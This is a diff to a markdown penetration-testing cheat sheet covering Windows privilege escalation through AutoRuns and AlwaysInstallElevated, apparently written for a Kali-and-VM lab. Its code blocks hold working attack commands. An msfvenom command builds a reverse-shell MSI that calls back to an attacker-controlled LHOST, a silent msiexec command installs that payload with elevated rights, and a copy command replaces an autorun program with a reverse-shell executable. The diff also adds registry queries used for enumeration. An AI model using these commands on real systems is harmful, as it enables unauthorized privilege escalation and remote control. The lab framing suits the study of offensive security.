@@ -1330,7 +1330,7 @@ net start dllsvc
 
 <br />
 
-##### Always Install Elevated
+##### AutoRuns
 
 ```ps1
 #########################################################################
@@ -1351,6 +1351,7 @@ reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
 copy /Y C:\PrivEsc\reverse.exe "C:\Program Files\Autorun Program\program.exe"
 ```
 
+##### Always Install Elevated
 
 ![image](https://user-images.githubusercontent.com/59018247/198085925-00b477ac-15ec-40f0-9910-abc520f47ab2.png)
 
@@ -1362,13 +1363,15 @@ copy /Y C:\PrivEsc\reverse.exe "C:\Program Files\Autorun Program\program.exe"
 # Winpeas Enumeration to see if both registry values are set
 .\winPEASany.exe quiet windowscreds
 
+# Manual Enumeration
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
 reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
 
 # Create a new reverse shell with msfvenom, this time using the msi format, and save it with the .msi extension
-msfvenom -p windows/x64/shell_reverse_tcp LHOST={IP ADDRESS} LPORT={PORT} -f msi -o reverse.msi
+msfvenom -p windows/x64/shell_reverse_tcp LHOST={LHOST} LPORT={LPORT} -f msi -o reverse.msi
 
 # Copy the reverse.msi across to the Windows VM, start a listener on Kali, and run the installer to trigger the exploit
-msiexec /quiet /qn /i C:\PrivEsc\reverse.msi
+msiexec /quiet /qn /i C:\users\public\downloads\reverse.msi
 
 ```
 
